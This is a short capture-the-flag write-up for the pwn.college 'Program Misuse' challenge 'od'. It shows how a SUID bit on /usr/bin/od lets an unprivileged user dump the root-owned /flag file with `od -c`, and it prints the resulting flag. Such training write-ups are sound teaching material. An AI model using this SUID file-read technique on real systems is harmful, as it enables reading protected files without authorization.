---
layout: page
title: "Challenge Name: od"
summary: "Writeup from Program Misuse"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Program Misuse"
date: 2026-04-27
---

**Category**: Program Misuse  
**Platform**: pwn.college  
**Difficulty**: Begineer
**Date**: 2025-07-15  
**Author**: Himanshu Parate

---

## 🧠 Summary:
The challenge abuses a SUID bit set on `/usr/bin/od`, allowing an unprivileged user to read the root-owned flag file at `/flag`.

---

## 🔍 Enumeration

```bash
ls -l /usr/bin/od
```

output:
```
-rwsr-xr-x 1 root root 47480 Sep  5  2019 /usr/bin/od
```

-The `s` in `-rws` indicates it's a SUID binary.
-`od` runs with **root privileges**.

## 🚀 Exploitation

The `od`  stands for Octal Dump, but it's a powerful tool to view raw byte-level representations of files — in hex, octal, decimal, ASCII, and more.

Basic Syntax of od:
```
od [options] filename
```
there are two helpful options, which can reveal the contents of a file:

| Option   | Description                        |
|----------|------------------------------------|
| `-c`     | Display ASCII characters           |
| `-t a`   | Display named characters           |

```bash
od -c /flag
```

Output:
```
0000000   p   w   n   .   c   o   l   l   e   g   e   {   o   B   o   C
0000020   z   H   t   9   l   X   k   W   t   F   u   9   P   o   v   U
0000040   A   _   p   j   m   K   7   .   d   N   T   N   x   w   S   M
0000060   0   I   z   M   y   E   z   W   }  \n
0000072
```

      
